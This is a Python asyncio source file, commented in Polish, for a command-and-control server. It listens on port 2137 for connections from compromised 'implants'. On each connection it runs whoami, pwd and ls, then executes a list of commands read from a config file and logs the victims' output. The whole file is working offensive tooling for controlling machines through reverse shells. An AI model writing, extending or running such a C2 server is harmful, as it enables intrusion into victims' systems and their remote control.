from threading import *
from time import *
from asyncio import *
from uuid import *
from aiofiles import * 
import datetime
sesje = {}

async def run_cmd(reader, writer, command, host, user):
    granica = str(uuid4())
    while not reader.at_eof():
        if reader._buffer:
         reader._buffer.clear()
        else:
            break

    command = "( "+ command
    command2 = f"&& echo -n {granica})\n"
    writer.write((command+command2).encode())
    await writer.drain()
    await sleep(0.1)

    odp = b""
    while granica.encode() not in odp:
        try:
            chunk = await wait_for(reader.read(4096),timeout=5)
            if not chunk:
                raise ConnectionError(f"[-]problem z połączeniem z implantem {user}@{host}")
            odp+=chunk
        except TimeoutError:
            raise ConnectionError(f"[-]timeout of {user}@{host} ended")
    output = odp.rsplit(granica.encode(),1)[0]
    async with open (f'c2_conf/main.log',mode='a') as log:
        await log.write(f"\n[{datetime.datetime.now()}] command {command} executed as {user}@{host} with output:\n {str(output.strip().decode())}")
    return output.strip()



async def handler(reader,writer):
    addr = writer.get_extra_info('peername')
    print(f"[N] znaleziono połączenie z {addr}")
    sesje[addr] = writer
    try:    
        username = "{C2_unknown}"
        try:
            await wait_for(reader.read(4096), timeout=0.3)
        except TimeoutError:
            pass
        output = await run_cmd(reader,writer,"whoami", addr, username)
        username = output.decode().strip()  
        print(f"[I] kolega {addr} ma na imie {username}")
        pwd = await run_cmd(reader, writer, "pwd", addr, username)
        pwd = pwd.decode().strip()
        print(f"[I] kolega {username}@{addr} znajduje się w {pwd}")
        ls = await run_cmd(reader,writer, "ls", addr, username)
        ls = ls.decode().strip()
        print(f"[I] ls dla {username}:\n {ls}")
        async with open("c2_conf/commands","r") as f:
            async for line in f:
                await run_cmd(reader,writer,line,addr,username)


        while True:
            data_ = await reader.read(1024)
            if not data_:
                break
        print(f"[{addr}] Otrzymano: {data_.decode().strip()}")

    except Exception as e:
        raise(e)
    finally:
        print(f"[-] zamykanie {addr}")
        writer.close()
        await writer.wait_closed()
        if addr in sesje: del sesje[addr]

async def main():
    server = await start_server(handler,'0.0.0.0','2137')
    print("[+] Serwer został uruchomiony")
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    try:
        run(main())
    except KeyboardInterrupt:
        pass
